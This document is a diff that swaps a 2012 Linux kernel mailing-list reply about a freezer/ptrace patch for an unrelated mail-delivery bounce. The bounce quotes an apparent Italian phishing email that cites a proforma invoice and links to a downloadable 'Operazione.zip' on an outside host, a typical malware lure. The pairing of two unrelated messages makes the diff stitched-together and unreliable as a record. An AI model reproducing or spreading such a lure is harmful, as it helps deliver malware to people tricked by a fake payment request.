@@ -1,24 +1,11 @@
-From: Oleg Nesterov <oleg-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Subject: Re: [PATCH v2 1/1] freezer: change ptrace_stop/do_signal_stop to
-	use freezable_schedule()
-Date: Sun, 28 Oct 2012 14:45:33 +0100
-Message-ID: <20121028134533.GA30847@redhat.com>
-References: <20121023153919.GA16201@redhat.com>
-	<20121024185710.GA12182@atj.dyndns.org>
-	<20121025163941.GA3801@redhat.com>
-	<20121025163959.GB3801@redhat.com>
-	<20121025171812.GE11442@htj.dyndns.org>
-	<20121025173433.GA7650@redhat.com>
-	<20121025173632.GI11442@htj.dyndns.org>
-	<20121026174545.GA21639@redhat.com>
-	<20121026174606.GB21639@redhat.com>
-	<1351376558.21585.1.camel@deadeye.wl.decadent.org.uk>
+From: Mail Delivery Subsystem <MAILER-DAEMON-cNOPY9FMLYsYi6lC9GrzQQ@public.gmane.org>
+Subject: Returned Mail:
+ Re: Rimesse!
+Date: Mon, 29 Oct 2012 02:27:23 +0100 (CET)
+Message-ID: <H078b7o9T1AxwR@mi-ob.rzone.de>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5706892485937344543=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <1351376558.21585.1.camel-nDn/Rdv9kqW9Jme8/bJn5UCKIB8iOfG2tUK59QYPAWc@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -28,38 +15,106 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Ben Hutchings <ben-/+tVBieCtBitmTQ+vhA3Yw@public.gmane.org>
-Cc: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, stable-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, rjw-KKrjLPT3xs0@public.gmane.org, Tejun Heo <tj-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On 10/27, Ben Hutchings wrote:
->
-> On Fri, 2012-10-26 at 19:46 +0200, Oleg Nesterov wrote:
-> > try_to_freeze_tasks() and cgroup_freezer rely on scheduler locks
-> > to ensure that a task doing STOPPED/TRACED -> RUNNING transition
-> > can't escape freezing. This mostly works, but ptrace_stop() does
-> > not necessarily call schedule(), it can change task->state back to
-> > RUNNING and check freezing() without any lock/barrier in between.
-> >
-> > We could add the necessary barrier, but this patch changes
-> > ptrace_stop() and do_signal_stop() to use freezable_schedule().
-> > This fixes the race, freezer_count() and freezer_should_skip()
-> > carefully avoid the race.
-> >
-> > And this simplifies the code, try_to_freeze_tasks/update_if_frozen
-> > no longer need to use task_is_stopped_or_traced() checks with the
-> > non trivial assumptions. We can rely on the mechanism which was
-> > specially designed to mark the sleeping task as "frozen enough".
-> >
-> > v2: As Tejun pointed out, we can also change get_signal_to_deliver()
-> > and move try_to_freeze() up before 'relock' label.
-> >
-> > Signed-off-by: Oleg Nesterov <oleg-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-> [...]
->
-> This is not the correct way to submit a change to stable.  Please see
-> Documentation/stable_kernel_rules.txt
+This is a MIME-encapsulated message
 
-Sorry for confusion, it is not for stable@, it was cc'ed by mistake.
+--===============5706892485937344543==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="H078b7o9T1AxwR/mi-ob.rzone.de"
 
-Oleg.
+This is a MIME-encapsulated message
+
+--H078b7o9T1AxwR/mi-ob.rzone.de
+Content-Type: text/plain; charset=UTF-8
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+*** MAIL DELIVERY FAILURE REPORT ***
+
+The original message was received at Tue, 02 Oct 2012 16:05:10 -0700
+from host [204.232.203.173] ([204.232.203.173:49008]).
+
+Subject: Re: Rimesse!
+From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+
+Mail delivery to the following recipient has finally failed:
+
+luther-summe-wBHO9JHgCTLa2NfCdcs/RBvVK+yQ3ZXh@public.gmane.org
+   Last reason: 554 5.2.2 Mailbox full
+   Explanation: Delivery failed: mailbox is full (quota exceeded)
+   Final attempt was: Mon, 29 Oct 2012 02:27:13 +0100 (CET)
+
+   Transcript of session:
+   ... while trying to deliver at mi-ob.rzone.de:
+   >>> DELIVER
+   <<< 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
+
+--H078b7o9T1AxwR/mi-ob.rzone.de
+Content-Type: message/delivery-status
+Content-Disposition: attachment
+
+Reporting-MTA: DNS; mi-ob.rzone.de
+Received-From-MTA: DNS; stable.skadate.com (204.232.203.173)
+Arrival-Date: Mon, 29 Oct 2012 02:00:07 +0100 (CET)
+
+Final-Recipient: RFC822; luther-summe-wBHO9JHgCTLa2NfCdcs/RBvVK+yQ3ZXh@public.gmane.org
+Action: failed
+Status: 5.2.2
+Diagnostic-Code: SMTP; 554 5.2.2 Delivery failed: mailbox is full (quota exceeded)
+Last-Attempt-Date: Mon, 29 Oct 2012 02:27:13 +0100 (CET)
+Final-Log-ID: H078b7o9T07UUx
+
+--H078b7o9T1AxwR/mi-ob.rzone.de
+Content-Type: message/rfc822
+Content-Disposition: attachment
+
+X-RZG-MI-VALUES: bm=0 mafl=1 sh=0 du=0 sp=2,1 vv=1 nf=0
+X-Strato-MessageType: email
+X-RZG-CLASS-ID: mi
+Received: from stable.skadate.com
+	(204-232-203-173.static.cloud-ips.com [204.232.203.173])
+	by mailin.rzone.de (jored mi67) (RZmta 30.20 OK)
+	with ESMTP id H078b7o9T07UUx for <luther-summe-wBHO9JHgCTLa2NfCdcs/RBvVK+yQ3ZXh@public.gmane.org>;
+	Mon, 29 Oct 2012 02:00:07 +0100 (CET)
+Received: from [204.232.203.173] ([204.232.203.173:49008])
+	by {#LAST_DNS} (envelope-from <update+1fdkAo4j6eV0uXjCXT@{#LAST_DNS}>)
+	(ecelerity 2.2.2.45 r(34222M)) with ECSTREAM
+	id 0E/{DIGITS>2<2#MARK-{DIGITS>4<4#MARK-5776B7935; Tue, 02 Oct 2012 16:05:10 -0700
+Date: Tue, 2 Oct 2012 16:05:10 -0700
+To: <luther-summe-wBHO9JHgCTLa2NfCdcs/RBvVK+yQ3ZXh@public.gmane.org>
+From: "inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Subject: Re: Rimesse!
+Message-ID: <sEd32hn9MJ9GrtTOMxy6iemTa61RKcJDqwG@{#LAST_DNS}>
+MIME-Version: 1.0
+Content-Type: text/plain;
+ charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+Gentile,=20
+      =20
+Si prega di confermare il 20% tt pagamento anticipato.
+nei confronti della fattura proforma PO00312/2012
+http://madonielive.com/Operazione.zip
+Aspetto la tua risposta
+
+Cordiali saluti
+
+
+
+--H078b7o9T1AxwR/mi-ob.rzone.de--
+
+
+--===============5706892485937344543==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============5706892485937344543==--
